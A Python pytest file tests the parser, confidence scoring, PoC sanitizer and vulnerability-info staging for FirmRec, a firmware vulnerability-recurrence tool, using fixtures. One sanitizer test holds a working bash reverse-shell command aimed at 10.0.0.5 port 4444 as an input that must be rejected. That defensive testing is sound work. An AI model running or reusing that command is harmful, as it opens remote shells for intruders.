"""FirmRec parser unit tests (firmrec.md §8: six branches, >=80% coverage).

These tests parse *fixtures only* -- they never invoke the real FirmRec image or
Docker (CI discipline, see AGENTS.md "改动守则"). Each fixture models one
of the six parser branches plus the confidence formula.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from tools.external.firmrec.parser import (
    compute_confidence,
    parse_firmrec_output,
)
from tools.external.firmrec.sanitize import sanitize_poc
from tools.external.firmrec.staging import (
    our_mode_ready,
    stage_upstream_vuln_info,
)
from tools.external.firmrec.vuln_info import stage_vuln_info

FIXTURES = (
    Path(__file__).resolve().parent.parent.parent / "tools" / "external" / "firmrec" / "fixtures"
)
# Abstract rootfs: FirmRec's binary ids are not real paths on this host.
ROOTFS = Path("/tmp/fake_rootfs")


def _parse(name: str):
    return parse_firmrec_output(FIXTURES / name, rootfs=ROOTFS, run_id="test", tool_version="v1")


def test_vulns_md_normal_yields_findings_with_cve():
    findings, stats = _parse("vulns_normal")
    assert len(findings) >= 1
    assert any(f["matched_cve"] == "CVE-2017-17215" for f in findings)
    assert findings[0]["tool"] == "firmrec"
    assert findings[0]["status"] == "ok"
    # Recurrence findings always carry matched_cve (the isolation signal).
    assert all(f.get("matched_cve") for f in findings)


def test_vulns_md_empty_returns_empty_ok():
    findings, stats = _parse("vulns_empty")
    assert findings == []
    assert stats.files_seen  # parser still recorded what it looked at


def test_pg_dump_normal_parses_binary_addr_similarity():
    findings, stats = _parse("pg_normal")
    assert len(findings) == 2
    by_cve = {f["matched_cve"]: f for f in findings}
    assert by_cve["CVE-2017-17215"]["sink"]["addr"] == "0x40a1b0"
    # Similarity 0.92 is used directly as confidence.
    assert by_cve["CVE-2017-17215"]["confidence"] == 0.92
    assert by_cve["CVE-2021-31802"]["vuln_class"] == "overflow"


def test_pg_dump_malformed_skips_bad_row_and_notes():
    findings, stats = _parse("pg_malformed")
    # The valid row is kept; the NOTANHEX row is dropped.
    assert len(findings) == 1
    assert stats.unparsed_lines >= 1


def test_poc_info_dangerous_payload_rejected_and_dropped():
    findings, stats = _parse("poc_dangerous")
    # An unsafe PoC must never be persisted.
    assert findings == []
    assert stats.dropped_unsafe >= 1


def test_no_result_version_difference_returns_empty_ok():
    findings, stats = _parse("no_result")
    assert findings == []
    assert all(f.get("status") == "ok" for f in findings)


def test_compute_confidence_direct_and_formula():
    assert compute_confidence(0.92) == 0.92
    assert compute_confidence(1.5) == 1.0  # capped
    assert compute_confidence(None, has_entry=True) == 0.7  # 0.5 + 0.2
    assert compute_confidence(None, has_entry=False) == 0.5


def test_sanitize_poc_rejects_reverse_shell_accepts_benign():
    _, ok_bad = sanitize_poc("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
    assert ok_bad is False
    _, ok_good = sanitize_poc("GET /goform/set.cgi HTTP/1.1")
    assert ok_good is True
    _, ok_empty = sanitize_poc("")
    assert ok_empty is True


def test_official_vuln_info_requires_a_real_file(tmp_path: Path):
    with pytest.raises(ValueError, match="not configured"):
        stage_vuln_info(tmp_path, source="official")


def test_official_vuln_info_copies_configured_data(tmp_path: Path):
    official = tmp_path / "upstream.json"
    official.write_text('[{"cve_id":"CVE-TEST"}]', encoding="utf-8")

    staged = stage_vuln_info(
        tmp_path / "run",
        source="official",
        official_path=official,
    )

    assert staged.read_text(encoding="utf-8") == official.read_text(encoding="utf-8")


def test_official_vuln_info_rejects_non_json_placeholder(tmp_path: Path):
    official = tmp_path / "upstream.json"
    official.write_text("placeholder", encoding="utf-8")

    with pytest.raises(ValueError, match="non-empty JSON list"):
        stage_vuln_info(
            tmp_path / "run",
            source="official",
            official_path=official,
        )


def _write_cve_fixture(root: Path, *, with_input: bool = True) -> Path:
    cve_dir = root / "CVE-2024-0001"
    cve_dir.mkdir(parents=True)
    metadata: dict = {"cve_id": "CVE-2024-0001", "device": "Acme Router"}
    if with_input:
        metadata["input"] = {"kv": {"REMOTE_ADDR": "BENIGN_MARKER"}}
    candidate = {
        "candidate_id": "cand-1",
        "binary_id": "bin/httpd",
        "metadata": metadata,
        "entry": {"function": "main"},
        "source": {"type": "http_param", "name": "REMOTE_ADDR"},
        "sink": {"function": "system", "type": "command_execution"},
        "vuln_class_hypothesis": "command_injection",
        "call_chain": ["main", "system"],
    }
    (cve_dir / "candidate.json").write_text(json.dumps(candidate), encoding="utf-8")
    return cve_dir


def test_stage_upstream_vuln_info_our_mode_requires_image_and_input(tmp_path: Path):
    root = tmp_path / "CVEs"
    _write_cve_fixture(root)

    staged = stage_upstream_vuln_info(
        tmp_path,
        source="our",
        cve_root=root,
        vuln_firmware_dir=None,
    )

    assert staged.vuln_refs == []
    assert any("no vulnerable firmware image" in item for item in staged.limitations)
    assert our_mode_ready(root, None) is False


def test_stage_upstream_vuln_info_our_mode_writes_meta_and_image(tmp_path: Path):
    root = tmp_path / "CVEs"
    _write_cve_fixture(root)
    images = tmp_path / "images"
    (images / "CVE-2024-0001").mkdir(parents=True)
    (images / "CVE-2024-0001" / "vuln.bin").write_bytes(b"firmware")

    staged = stage_upstream_vuln_info(
        tmp_path,
        source="our",
        cve_root=root,
        vuln_firmware_dir=images,
    )

    assert staged.vuln_refs == ["Acme-Router/CVE-2024-0001"]
    vuln_dir = tmp_path / "inout" / "vuln_info" / "Acme-Router" / "CVE-2024-0001"
    meta = json.loads((vuln_dir / "meta.json").read_text(encoding="utf-8"))
    assert meta["firmware_filename"] == "vuln-bin"
    assert meta["input"] == {"kv": {"REMOTE_ADDR": "BENIGN_MARKER"}}
    assert (vuln_dir / "vuln-bin").is_file()
    assert our_mode_ready(root, images) is True


def test_stage_upstream_vuln_info_official_directory(tmp_path: Path):
    official = tmp_path / "official"
    vuln_dir = official / "acme" / "CVE-2024-0002"
    vuln_dir.mkdir(parents=True)
    (vuln_dir / "meta.json").write_text("{}", encoding="utf-8")
    (vuln_dir / "vuln.bin").write_bytes(b"firmware")

    staged = stage_upstream_vuln_info(
        tmp_path,
        source="official",
        official_dir=official,
    )

    assert staged.vuln_refs == ["acme/CVE-2024-0002"]
    assert (tmp_path / "inout" / "vuln_info" / "acme" / "CVE-2024-0002" / "meta.json").is_file()


def test_stage_upstream_vuln_info_official_json_is_rejected(tmp_path: Path):
    official = tmp_path / "official.json"
    official.write_text('[{"cve_id":"CVE-2024-0003"}]', encoding="utf-8")

    with pytest.raises(ValueError, match="must be an upstream directory tree"):
        stage_upstream_vuln_info(tmp_path, source="official", official_dir=official)
